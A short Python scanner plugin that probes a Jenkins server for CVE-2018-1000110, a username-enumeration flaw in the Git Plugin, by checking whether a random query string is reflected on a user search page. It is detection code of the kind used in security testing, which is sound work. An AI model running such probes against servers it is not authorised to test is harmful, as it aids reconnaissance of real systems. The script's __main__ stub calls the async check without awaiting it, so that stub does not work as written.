#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2018_1000110_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2018-1000110漏洞',
            'description': 'CVE-2018-1000110漏洞,可用来用户名枚举,受影响版本: Jenkins Git Plugin version 3.7.0 and earlier in GitStatus.java',
            'date': '2018-03-13',
            'exptype': 'check',
            'type': 'Username Enum'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }
        self.capta = get_capta()

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        result = ""
        url = self.url + "/securityRealm/user/admin/search/index?q="
        try:
            check_req = await request.get(url + self.capta, headers = self.headers)
            if "Search for '%s'" % (self.capta) in await check_req.text():
                return True
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    CVE_2018_1000110 = CVE_2018_1000110_BaseVerify('http://10.4.69.55:8789')
    CVE_2018_1000110.check()